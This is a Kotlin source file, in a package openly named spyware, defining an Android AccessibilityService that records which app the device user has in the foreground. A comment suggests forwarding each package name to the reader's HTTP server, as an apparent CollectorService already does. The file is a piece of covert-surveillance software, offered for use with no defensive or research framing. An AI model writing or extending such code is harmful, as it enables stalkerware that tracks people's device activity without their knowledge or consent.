package com.example.spyware

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.util.Log

class MonitorService : AccessibilityService() {
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event?.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val packageName = event.packageName?.toString() ?: return
            Log.d("MonitorService", "Active App: $packageName")
            
            // You can send this packageName to your HTTP server here, 
            // just like you do in CollectorService.kt
        }
    }

    override fun onInterrupt() {}
}